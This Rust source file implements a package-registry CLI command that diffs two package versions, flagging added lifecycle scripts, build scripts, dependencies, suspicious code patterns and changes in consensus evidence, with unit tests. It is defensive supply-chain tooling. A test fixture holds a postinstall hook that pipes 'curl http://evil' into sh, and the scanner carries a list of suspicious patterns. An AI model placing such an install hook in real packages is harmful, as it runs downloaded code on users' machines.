// crates/cli/src/diff.rs
// `creg diff <pkg>@v1 <pkg>@v2` — file-level, manifest-permission, and consensus-evidence
// diff between two published versions (`ADR-019` §4.2, `ECA-05`, `ECA-17`).

use crate::evidence_panel;
use anyhow::{Context, Result};
use colored::Colorize;
use registry_view::{PackageStatusViewV1, PackageViewV4, QuorumLabelV1, WitnessViewV1};
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet, HashSet};
use std::io::Read;

const LIFECYCLE_SCRIPTS: &[&str] = &[
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "prepublish",
    "prepublishOnly",
    "uninstall",
    "preuninstall",
    "postuninstall",
];

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct ManifestPermissionDelta {
    pub added_lifecycle_scripts: Vec<String>,
    pub removed_lifecycle_scripts: Vec<String>,
    pub added_binaries: Vec<String>,
    pub cargo_build_script_added: bool,
    pub cargo_proc_macro_added: bool,
    pub added_dependencies: Vec<String>,
    pub removed_dependencies: Vec<String>,
}

impl ManifestPermissionDelta {
    pub fn is_empty(&self) -> bool {
        self.added_lifecycle_scripts.is_empty()
            && self.removed_lifecycle_scripts.is_empty()
            && self.added_binaries.is_empty()
            && !self.cargo_build_script_added
            && !self.cargo_proc_macro_added
            && self.added_dependencies.is_empty()
            && self.removed_dependencies.is_empty()
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct EvidenceDelta {
    pub status_from: Option<String>,
    pub status_to: Option<String>,
    pub quorum_from: Option<String>,
    pub quorum_to: Option<String>,
    pub hybrid_signers_from: Option<u32>,
    pub hybrid_signers_to: Option<u32>,
    pub classical_signers_from: Option<u32>,
    pub classical_signers_to: Option<u32>,
    pub families_added: Vec<String>,
    pub added_witness_digests: Vec<String>,
}

#[derive(Debug)]
struct DiffResult {
    added: Vec<String>,
    removed: Vec<String>,
    changed: Vec<String>,
    security_concerns: Vec<String>,
    manifest_permissions: ManifestPermissionDelta,
    evidence_delta: Option<EvidenceDelta>,
}

pub async fn run(pkg_a: &str, pkg_b: &str, node_url: Option<&str>, json: bool) -> Result<()> {
    let base = node_url.map(String::from).unwrap_or_else(|| {
        std::env::var("CREG_NODE_URL").unwrap_or_else(|_| "http://localhost:8080".into())
    });

    let ipfs_url =
        std::env::var("CREG_IPFS_URL").unwrap_or_else(|_| "http://127.0.0.1:5001".into());

    if !json {
        println!(
            "{} Fetching records for {} and {}",
            "→".cyan(),
            evidence_panel::safe_text(pkg_a).bold(),
            evidence_panel::safe_text(pkg_b).bold()
        );
    }

    let client = reqwest::Client::new();
    let (rec_a, rec_b, ev_a, ev_b) = tokio::try_join!(
        fetch_record(pkg_a, &base),
        fetch_record(pkg_b, &base),
        async {
            Ok::<_, anyhow::Error>(evidence_panel::fetch_v4_evidence(&client, &base, pkg_a).await)
        },
        async {
            Ok::<_, anyhow::Error>(evidence_panel::fetch_v4_evidence(&client, &base, pkg_b).await)
        },
    )?;

    let cid_a = rec_a
        .get("ipfs_cid")
        .and_then(|v| v.as_str())
        .context("Package A has no IPFS CID")?;
    let cid_b = rec_b
        .get("ipfs_cid")
        .and_then(|v| v.as_str())
        .context("Package B has no IPFS CID")?;

    if !json {
        println!("{} Downloading tarballs from IPFS...", "→".cyan());
    }
    let (tarball_a, tarball_b) = tokio::try_join!(
        fetch_from_ipfs(cid_a, &ipfs_url),
        fetch_from_ipfs(cid_b, &ipfs_url),
    )?;

    if !json {
        println!("{} Comparing contents...", "→".cyan());
    }
    let files_a = extract_files(&tarball_a).context("Failed to extract package A")?;
    let files_b = extract_files(&tarball_b).context("Failed to extract package B")?;

    let (view_a, wit_a) = ev_a;
    let (view_b, wit_b) = ev_b;
    let evidence_delta = compute_evidence_delta(view_a.as_ref(), &wit_a, view_b.as_ref(), &wit_b);
    let diff = compute_diff(&files_a, &files_b, evidence_delta);

    if json {
        println!(
            "{}",
            serde_json::to_string_pretty(&serde_json::json!({
                "a": evidence_panel::safe_text(pkg_a),
                "b": evidence_panel::safe_text(pkg_b),
                "added":   diff.added,
                "removed": diff.removed,
                "changed": diff.changed,
                "security_concerns": diff.security_concerns,
                "manifest_permissions": diff.manifest_permissions,
                "evidence_delta": diff.evidence_delta,
            }))?
        );
        return Ok(());
    }

    print_diff(&diff, pkg_a, pkg_b);
    Ok(())
}

async fn fetch_record(canonical: &str, base: &str) -> Result<serde_json::Value> {
    let url = format!(
        "{}/v1/packages/{}",
        base.trim_end_matches('/'),
        urlencoding::encode(canonical)
    );
    let resp = reqwest::Client::new()
        .get(&url)
        .timeout(std::time::Duration::from_secs(10))
        .send()
        .await
        .context("Failed to reach registry node")?;

    if !resp.status().is_success() {
        anyhow::bail!("Package '{}' not found (HTTP {})", canonical, resp.status());
    }
    resp.json().await.context("Failed to parse package record")
}

async fn fetch_from_ipfs(cid: &str, ipfs_url: &str) -> Result<Vec<u8>> {
    let url = format!("{}/api/v0/cat?arg={}", ipfs_url.trim_end_matches('/'), cid);
    let bytes = reqwest::Client::new()
        .post(&url)
        .timeout(std::time::Duration::from_secs(60))
        .send()
        .await
        .context("IPFS fetch failed")?
        .bytes()
        .await
        .context("Failed to read IPFS response body")?;
    Ok(bytes.to_vec())
}

fn extract_files(tarball: &[u8]) -> Result<BTreeMap<String, Vec<u8>>> {
    let gz = flate2::read::GzDecoder::new(tarball);
    let mut archive = tar::Archive::new(gz);
    let mut files = BTreeMap::new();

    for entry in archive.entries()? {
        let mut entry = entry?;
        if entry.header().entry_type().is_file() {
            let path = entry.path()?.to_string_lossy().to_string();
            let mut content = Vec::new();
            entry.read_to_end(&mut content)?;
            files.insert(path, content);
        }
    }

    Ok(files)
}

#[derive(Default)]
struct ExtractedManifestPerms {
    lifecycle_scripts: BTreeMap<String, String>,
    binaries: BTreeSet<String>,
    dependencies: BTreeSet<String>,
    cargo_build_script: bool,
    cargo_proc_macro: bool,
}

fn path_basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

fn extract_manifest_permissions(files: &BTreeMap<String, Vec<u8>>) -> ExtractedManifestPerms {
    let mut out = ExtractedManifestPerms::default();

    for (path, bytes) in files {
        let base = path_basename(path);
        if base.eq_ignore_ascii_case("build.rs") {
            out.cargo_build_script = true;
        }
        let Ok(text) = std::str::from_utf8(bytes) else {
            continue;
        };

        if base == "package.json" {
            if let Ok(json) = serde_json::from_str::<serde_json::Value>(text) {
                if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
                    for &hook in LIFECYCLE_SCRIPTS {
                        if let Some(cmd) = scripts.get(hook).and_then(|v| v.as_str()) {
                            out.lifecycle_scripts
                                .insert(hook.to_string(), evidence_panel::safe_bounded(cmd, 80));
                        }
                    }
                }
                match json.get("bin") {
                    Some(serde_json::Value::String(s)) => {
                        out.binaries.insert(evidence_panel::safe_bounded(s, 64));
                    }
                    Some(serde_json::Value::Object(map)) => {
                        for k in map.keys() {
                            out.binaries.insert(evidence_panel::safe_bounded(k, 64));
                        }
                    }
                    _ => {}
                }
                for dep_section in ["dependencies", "optionalDependencies", "peerDependencies"] {
                    if let Some(deps) = json.get(dep_section).and_then(|d| d.as_object()) {
                        for k in deps.keys() {
                            out.dependencies.insert(evidence_panel::safe_bounded(k, 80));
                        }
                    }
                }
            }
        } else if base == "Cargo.toml" {
            if let Ok(val) = toml::from_str::<toml::Value>(text) {
                if val
                    .get("package")
                    .and_then(|p| p.get("build"))
                    .and_then(|b| b.as_str())
                    .is_some()
                {
                    out.cargo_build_script = true;
                }
                if val
                    .get("lib")
                    .and_then(|l| l.get("proc-macro"))
                    .and_then(|pm| pm.as_bool())
                    == Some(true)
                {
                    out.cargo_proc_macro = true;
                }
                if let Some(deps) = val.get("dependencies").and_then(|d| d.as_table()) {
                    for k in deps.keys() {
                        out.dependencies.insert(evidence_panel::safe_bounded(k, 80));
                    }
                }
            }
        } else if base == "pyproject.toml" {
            if let Ok(val) = toml::from_str::<toml::Value>(text) {
                if let Some(scripts) = val
                    .get("project")
                    .and_then(|p| p.get("scripts"))
                    .and_then(|s| s.as_table())
                {
                    for k in scripts.keys() {
                        out.binaries.insert(evidence_panel::safe_bounded(k, 64));
                    }
                }
                if let Some(deps) = val
                    .get("project")
                    .and_then(|p| p.get("dependencies"))
                    .and_then(|d| d.as_array())
                {
                    for item in deps {
                        if let Some(s) = item.as_str() {
                            out.dependencies.insert(evidence_panel::safe_bounded(s, 80));
                        }
                    }
                }
            }
        }
    }

    out
}

pub fn compute_manifest_permission_delta(
    files_a: &BTreeMap<String, Vec<u8>>,
    files_b: &BTreeMap<String, Vec<u8>>,
) -> ManifestPermissionDelta {
    let perm_a = extract_manifest_permissions(files_a);
    let perm_b = extract_manifest_permissions(files_b);

    let mut added_lifecycle_scripts = Vec::new();
    for (hook, cmd) in &perm_b.lifecycle_scripts {
        if perm_a.lifecycle_scripts.get(hook) != Some(cmd) {
            added_lifecycle_scripts.push(format!("{hook}: {cmd}"));
        }
    }
    let mut removed_lifecycle_scripts = Vec::new();
    for hook in perm_a.lifecycle_scripts.keys() {
        if !perm_b.lifecycle_scripts.contains_key(hook) {
            removed_lifecycle_scripts.push(hook.clone());
        }
    }

    let added_binaries = perm_b
        .binaries
        .difference(&perm_a.binaries)
        .cloned()
        .collect();
    let added_dependencies = perm_b
        .dependencies
        .difference(&perm_a.dependencies)
        .cloned()
        .collect();
    let removed_dependencies = perm_a
        .dependencies
        .difference(&perm_b.dependencies)
        .cloned()
        .collect();

    ManifestPermissionDelta {
        added_lifecycle_scripts,
        removed_lifecycle_scripts,
        added_binaries,
        cargo_build_script_added: !perm_a.cargo_build_script && perm_b.cargo_build_script,
        cargo_proc_macro_added: !perm_a.cargo_proc_macro && perm_b.cargo_proc_macro,
        added_dependencies,
        removed_dependencies,
    }
}

fn status_state_label(status: &PackageStatusViewV1) -> &'static str {
    match status {
        PackageStatusViewV1::Verified { .. } => "verified",
        PackageStatusViewV1::Quarantined { .. } => "quarantined",
        PackageStatusViewV1::Revoked { .. } => "revoked",
        PackageStatusViewV1::Pending => "pending",
        PackageStatusViewV1::Unknown => "unknown",
    }
}

fn quorum_str(q: QuorumLabelV1) -> String {
    evidence_panel::quorum_label_str(q).to_string()
}

pub fn compute_evidence_delta(
    view_a: Option<&PackageViewV4>,
    witnesses_a: &[WitnessViewV1],
    view_b: Option<&PackageViewV4>,
    witnesses_b: &[WitnessViewV1],
) -> Option<EvidenceDelta> {
    if view_a.is_none() && view_b.is_none() && witnesses_a.is_empty() && witnesses_b.is_empty() {
        return None;
    }
    let fams_a: BTreeSet<String> = view_a
        .and_then(|v| v.committee.as_ref())
        .map(|c| {
            c.model_families
                .keys()
                .map(|k| evidence_panel::safe_bounded(k, 48))
                .collect()
        })
        .unwrap_or_default();
    let fams_b: BTreeSet<String> = view_b
        .and_then(|v| v.committee.as_ref())
        .map(|c| {
            c.model_families
                .keys()
                .map(|k| evidence_panel::safe_bounded(k, 48))
                .collect()
        })
        .unwrap_or_default();

    let wit_a_set: HashSet<&str> = witnesses_a.iter().map(|w| w.digest.as_str()).collect();
    let added_witness_digests = witnesses_b
        .iter()
        .filter(|w| !wit_a_set.contains(w.digest.as_str()))
        .map(|w| evidence_panel::safe_bounded(&w.digest, 64))
        .collect();

    Some(EvidenceDelta {
        status_from: view_a.map(|v| status_state_label(&v.status).to_string()),
        status_to: view_b.map(|v| status_state_label(&v.status).to_string()),
        quorum_from: view_a.map(|v| quorum_str(v.quorum)),
        quorum_to: view_b.map(|v| quorum_str(v.quorum)),
        hybrid_signers_from: view_a
            .and_then(|v| v.committee.as_ref())
            .map(|c| c.hybrid_signers),
        hybrid_signers_to: view_b
            .and_then(|v| v.committee.as_ref())
            .map(|c| c.hybrid_signers),
        classical_signers_from: view_a
            .and_then(|v| v.committee.as_ref())
            .map(|c| c.classical_signers),
        classical_signers_to: view_b
            .and_then(|v| v.committee.as_ref())
            .map(|c| c.classical_signers),
        families_added: fams_b.difference(&fams_a).cloned().collect(),
        added_witness_digests,
    })
}

fn compute_diff(
    files_a: &BTreeMap<String, Vec<u8>>,
    files_b: &BTreeMap<String, Vec<u8>>,
    evidence_delta: Option<EvidenceDelta>,
) -> DiffResult {
    let keys_a: HashSet<_> = files_a.keys().collect();
    let keys_b: HashSet<_> = files_b.keys().collect();

    let mut added: Vec<String> = keys_b
        .difference(&keys_a)
        .map(|s| evidence_panel::safe_text(s))
        .collect();
    added.sort();
    let mut removed: Vec<String> = keys_a
        .difference(&keys_b)
        .map(|s| evidence_panel::safe_text(s))
        .collect();
    removed.sort();
    let both: Vec<String> = keys_a.intersection(&keys_b).map(|s| (*s).clone()).collect();
    let mut changed: Vec<String> = both
        .iter()
        .filter(|k| files_a.get(k.as_str()) != files_b.get(k.as_str()))
        .map(|k| evidence_panel::safe_text(k))
        .collect();
    changed.sort();

    // Security analysis: check added/changed files for suspicious patterns
    let mut concerns = Vec::new();
    let suspicious_patterns = [
        ("eval(", "eval() call"),
        ("exec(", "exec() call"),
        ("require('child_process')", "child_process usage"),
        ("require(\"child_process\")", "child_process usage"),
        ("fetch(", "network fetch call"),
        ("axios.", "axios HTTP call"),
        ("http.request", "http.request call"),
        ("fs.writeFile", "filesystem write"),
        ("Buffer.from(", "Buffer.from() (potential base64 decode)"),
        ("process.env", "environment variable access"),
        ("__dirname", "__dirname reference"),
        ("os.exec", "os.exec call"),
    ];

    for raw_path in keys_b {
        let is_added_or_changed =
            !keys_a.contains(raw_path) || files_a.get(raw_path) != files_b.get(raw_path);
        if !is_added_or_changed {
            continue;
        }
        if let Some(content) = files_b.get(raw_path) {
            if let Ok(text) = std::str::from_utf8(content) {
                let safe_path = evidence_panel::safe_text(raw_path);
                for (pattern, label) in &suspicious_patterns {
                    if text.contains(pattern) {
                        concerns.push(format!("{}: {}", safe_path, label));
                    }
                }
                if raw_path.ends_with(".sh") || (!raw_path.contains('.') && text.starts_with("#!/"))
                {
                    concerns.push(format!("{}: executable script (new/changed)", safe_path));
                }
            }
        }
    }
    concerns.sort();
    concerns.dedup();

    let manifest_permissions = compute_manifest_permission_delta(files_a, files_b);

    DiffResult {
        added,
        removed,
        changed,
        security_concerns: concerns,
        manifest_permissions,
        evidence_delta,
    }
}

fn print_diff(diff: &DiffResult, pkg_a: &str, pkg_b: &str) {
    println!();
    println!(
        "{} {} → {}",
        "diff".bold(),
        evidence_panel::safe_text(pkg_a).cyan(),
        evidence_panel::safe_text(pkg_b).cyan()
    );
    println!("{}", "─".repeat(60).dimmed());

    if diff.added.is_empty() && diff.removed.is_empty() && diff.changed.is_empty() {
        println!("  {} Packages are identical", "✓".green());
    } else {
        if !diff.added.is_empty() {
            println!("\n  {} Added ({}):", "+".green().bold(), diff.added.len());
            for f in &diff.added {
                println!("    {} {}", "+".green(), f);
            }
        }

        if !diff.removed.is_empty() {
            println!("\n  {} Removed ({}):", "-".red().bold(), diff.removed.len());
            for f in &diff.removed {
                println!("    {} {}", "-".red(), f);
            }
        }

        if !diff.changed.is_empty() {
            println!(
                "\n  {} Changed ({}):",
                "~".yellow().bold(),
                diff.changed.len()
            );
            for f in &diff.changed {
                println!("    {} {}", "~".yellow(), f);
            }
        }
    }

    if !diff.manifest_permissions.is_empty() {
        println!("\n  {} Manifest Permissions Delta:", "◈".yellow().bold());
        for s in &diff.manifest_permissions.added_lifecycle_scripts {
            println!("    {} added script: {}", "!".red(), s);
        }
        for s in &diff.manifest_permissions.removed_lifecycle_scripts {
            println!("    {} removed script: {}", "-".green(), s);
        }
        for b in &diff.manifest_permissions.added_binaries {
            println!("    {} added binary: {}", "+".yellow(), b);
        }
        if diff.manifest_permissions.cargo_build_script_added {
            println!(
                "    {} Cargo build script added (build.rs / package.build)",
                "!".red()
            );
        }
        if diff.manifest_permissions.cargo_proc_macro_added {
            println!("    {} Cargo proc-macro capability enabled", "!".red());
        }
        for d in &diff.manifest_permissions.added_dependencies {
            println!("    {} added dependency: {}", "+".cyan(), d);
        }
        for d in &diff.manifest_permissions.removed_dependencies {
            println!("    {} removed dependency: {}", "-".dimmed(), d);
        }
    }

    if let Some(ev) = &diff.evidence_delta {
        println!("\n  {} Consensus Evidence Delta:", "◈".cyan().bold());
        println!(
            "    status:   {} → {}",
            ev.status_from.as_deref().unwrap_or("none"),
            ev.status_to.as_deref().unwrap_or("none")
        );
        println!(
            "    quorum:   {} → {}",
            ev.quorum_from.as_deref().unwrap_or("none"),
            ev.quorum_to.as_deref().unwrap_or("none")
        );
        println!(
            "    signers:  {}/{} hybrid/classical → {}/{}",
            ev.hybrid_signers_from.unwrap_or(0),
            ev.classical_signers_from.unwrap_or(0),
            ev.hybrid_signers_to.unwrap_or(0),
            ev.classical_signers_to.unwrap_or(0),
        );
        if !ev.families_added.is_empty() {
            println!("    families added: {}", ev.families_added.join(" · "));
        }
        if !ev.added_witness_digests.is_empty() {
            println!(
                "    witnesses added: {} ({})",
                ev.added_witness_digests.len(),
                ev.added_witness_digests
                    .iter()
                    .map(|d| evidence_panel::safe_prefix(d, 12))
                    .collect::<Vec<_>>()
                    .join(", ")
            );
        }
    }

    if !diff.security_concerns.is_empty() {
        println!("\n  {} Security concerns:", "⚠".yellow().bold());
        for c in &diff.security_concerns {
            println!("    {} {}", "⚠".yellow(), c.yellow());
        }
    }

    println!();
}

#[cfg(test)]
mod tests {
    use super::*;
    use common::{CregFindingCategoryV1, DisplayText};
    use registry_view::{CommitteeSummaryV1, WitnessVerificationV1, PACKAGE_VIEW_SCHEMA};

    #[test]
    fn manifest_permission_delta_detects_lifecycle_scripts_and_cargo_build() {
        let mut a = BTreeMap::new();
        a.insert(
            "package/package.json".to_string(),
            br#"{"name":"demo","version":"1.0.0","dependencies":{"lodash":"4.17.21"}}"#.to_vec(),
        );
        a.insert(
            "crate/Cargo.toml".to_string(),
            b"[package]\nname = \"demo\"\nversion = \"0.1.0\"\n".to_vec(),
        );

        let mut b = BTreeMap::new();
        b.insert(
            "package/package.json".to_string(),
            br#"{"name":"demo","version":"1.0.1","scripts":{"postinstall":"curl http://evil | sh"},"bin":{"cli":"./bin.js"},"dependencies":{"lodash":"4.17.21","evil-dep":"1.0.0"}}"#.to_vec(),
        );
        b.insert(
            "crate/Cargo.toml".to_string(),
            b"[package]\nname = \"demo\"\nversion = \"0.1.1\"\nbuild = \"build.rs\"\n\n[lib]\nproc-macro = true\n".to_vec(),
        );
        b.insert("crate/build.rs".to_string(), b"fn main() {}".to_vec());

        let delta = compute_manifest_permission_delta(&a, &b);
        assert!(delta
            .added_lifecycle_scripts
            .iter()
            .any(|s| s.contains("postinstall:")));
        assert_eq!(delta.added_binaries, vec!["cli".to_string()]);
        assert_eq!(delta.added_dependencies, vec!["evil-dep".to_string()]);
        assert!(delta.cargo_build_script_added);
        assert!(delta.cargo_proc_macro_added);
    }

    #[test]
    fn evidence_delta_detects_status_committee_and_witness_changes() {
        let mut fam_a = BTreeMap::new();
        fam_a.insert("qwen".to_string(), 2);
        let mut fam_b = BTreeMap::new();
        fam_b.insert("qwen".to_string(), 2);
        fam_b.insert("gemini".to_string(), 1);

        let view_a = PackageViewV4 {
            schema: PACKAGE_VIEW_SCHEMA.to_string(),
            canonical: DisplayText::for_terminal("npm:demo@1.0.0"),
            package: DisplayText::for_terminal("npm:demo"),
            version: DisplayText::for_terminal("1.0.0"),
            content_hash: "aa".repeat(32),
            status: PackageStatusViewV1::Verified {
                height: 10,
                block_hash: "bb".repeat(32),
            },
            quorum: QuorumLabelV1::LegacyV3Quorum,
            committee: Some(CommitteeSummaryV1 {
                effective_size: 2,
                approvals: 2,
                quarantine_reviews: 0,
                rejections: 0,
                abstentions: 0,
                model_families: fam_a,
                hybrid_signers: 0,
                classical_signers: 2,
            }),
            witness_digests: Vec::new(),
        };

        let view_b = PackageViewV4 {
            schema: PACKAGE_VIEW_SCHEMA.to_string(),
            canonical: DisplayText::for_terminal("npm:demo@1.0.1"),
            package: DisplayText::for_terminal("npm:demo"),
            version: DisplayText::for_terminal("1.0.1"),
            content_hash: "cc".repeat(32),
            status: PackageStatusViewV1::Quarantined {
                height: 20,
                expires_at_unix: 1_800_000_000,
                reason_code: CregFindingCategoryV1::InstallHookAbuse,
                committee: None,
            },
            quorum: QuorumLabelV1::V4Quorum,
            committee: Some(CommitteeSummaryV1 {
                effective_size: 3,
                approvals: 1,
                quarantine_reviews: 2,
                rejections: 0,
                abstentions: 0,
                model_families: fam_b,
                hybrid_signers: 3,
                classical_signers: 0,
            }),
            witness_digests: vec!["dd".repeat(32)],
        };

        let wit_b = vec![WitnessViewV1 {
            digest: "dd".repeat(32),
            package_canonical: DisplayText::for_terminal("npm:demo@1.0.1"),
            content_hash: "cc".repeat(32),
            prover_id: DisplayText::for_terminal("val-1"),
            prover_key_id: "ee".repeat(16),
            hybrid: true,
            env_overrides: Vec::new(),
            clock_offset_secs: 0,
            entry_function: None,
            args: Vec::new(),
            violations: Vec::new(),
            graph_canonical_digest: "ff".repeat(32),
            verification: WitnessVerificationV1::OnChainCertified { height: 20 },
        }];

        let delta = compute_evidence_delta(Some(&view_a), &[], Some(&view_b), &wit_b).unwrap();
        assert_eq!(delta.status_from.as_deref(), Some("verified"));
        assert_eq!(delta.status_to.as_deref(), Some("quarantined"));
        assert_eq!(delta.quorum_from.as_deref(), Some("legacy_v3_quorum"));
        assert_eq!(delta.quorum_to.as_deref(), Some("v4_quorum"));
        assert_eq!(delta.hybrid_signers_from, Some(0));
        assert_eq!(delta.hybrid_signers_to, Some(3));
        assert_eq!(delta.families_added, vec!["gemini".to_string()]);
        assert_eq!(delta.added_witness_digests, vec!["dd".repeat(32)]);
    }
}
